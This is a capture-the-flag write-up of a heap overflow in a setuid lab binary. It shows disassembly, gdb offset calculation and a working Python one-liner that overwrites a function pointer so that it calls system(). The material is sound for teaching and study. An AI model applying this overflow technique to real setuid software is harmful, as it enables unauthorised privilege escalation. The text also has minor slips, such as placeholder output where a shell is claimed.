# LEVEL06 - Heap Overflow & Function Pointer Overwrite

> Vulnerability class: Heap Buffer Overflow
> Binary: ELF 32-bits, dynamically linked, not stripped
> Tools used: GDB, objdump, file

---

## Overview

he program allocates two heap buffers with `malloc()`: one for user input copied via `strcpy()`, and one storing a function pointer called at the end of `main()`. By overflowing the first buffer, we overwrite the function pointer in the second buffer, redirecting execution from `m()` to the privileged `n()` function which calls `system()`.

---

## 1. Reconnaissance

```bash
$ file level6
level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, not stripped
```
```bash
$ checksec --file ./level6
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level6
```

Key observations:

- setuid/setgid binary: successful exploitation escalates privileges
- not stripped: function names are preserved, simplifying static analysis
- dynamically linked: library functions resolved at runtime via PLT/GOT
- NX disabled: the stack and heap are executable, meaning injected shellcode can run directly
- ASLR off: addresses are fixed across runs, no need to leak or brute force memory layout
- No stack canary: the saved return address can be overwritten without triggering any detection
- No PIE: the binary is loaded at a fixed base address every time, making PLT/GOT addresses predictable

---

## 2. Static Analysis

### 2.1 The `main()` function

`main()` allocates two heap buffers, copies `argv[1]` into the first via `strcpy()`, then calls the function pointer stored in the second:
```asm
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
```

Under normal execution, the function pointer points to `m()`, which prints `"Nope"`.
```asm
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
```
```
   (gdb) x/s 0x80485d1
   0x80485d1:       "Nope"
```

### 2.2 The `n()` function

`n()` is never called by normal control flow but contains the target `system()` call:
```
   0x08048454 <+0>:     push   %ebp
   [...]
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)         ; "/bin/sh"
   0x08048461 <+13>:    call   0x8048370 <system@plt>
```

Goal: overwrite the function pointer in the second heap buffer with the address of `n()` (`0x08048454`).

---

## 3. Vulnerability

Root cause: `strcpy()` performs no bounds checking. The first heap buffer receives `argv[1]` without any length validation, allowing a write that extends beyond its boundaries into adjacent heap memory where the function pointer lives.

---

## 4. Exploitation

### 4.1 Offset calculation

The two `malloc()` calls return consecutive heap addresses. We find them in GDB by inspecting `eax` after each call:
```bash
   # First malloc (input buffer)
   (gdb) info registers eax
   eax            0x804a008        134520840
```
```bash
   # Second malloc (function pointer)
   (gdb) info registers eax
   eax            0x804a050        134520912
   (gdb) p 0x804a050 - 0x804a008
   $1 = 72
```

Confirmed by inspecting heap contents after overflow with 100 `A`s:
Or if we feed our program of 100 A's for instance:
```
   (gdb) x/s 0x804a050
   0x804a050:       'A' <repeats 28 times>
   (gdb) x/s 0x804a008
   0x804a008:       'A' <repeats 100 times>
```
`100 - 28 = 72` — the function pointer sits exactly 72 bytes from the start of the first buffer.


### 4.2 Payload construction

```txt
   [ 72 bytes padding ] + [ address of n() ]
```
- 72 bytes of `A` fill the first heap buffer and the heap metadata up to the function pointer
- `\x54\x84\x04\x08` — address of `n()` in little-endian, overwrites the function pointer in the second buffer

### 4.3 Execution

```bash
   level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x08\x04\x84\x54"[::-1]')
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

When `main()` dereferences and calls the function pointer, it now points to `n()` instead of `m()`, spawning a shell.

---

## 5. Key Takeaways

| Concept | Detail |
|---|---|
| `strcpy()` is unsafe | Performs no bounds checking — always prefer `strncpy()` with explicit size limits |
| Heap layout predictability | With ASLR off, consecutive `malloc()` calls return fixed, predictable addresses |
| Function pointer overwrite | Overwriting a heap-stored function pointer redirects control flow without touching the stack |
| Heap overflow vs stack overflow | Same overflow primitive, different target — heap metadata and adjacent allocations are at risk |
| Dead code reachability | `n()` is never called normally but becomes reachable via control flow hijacking |
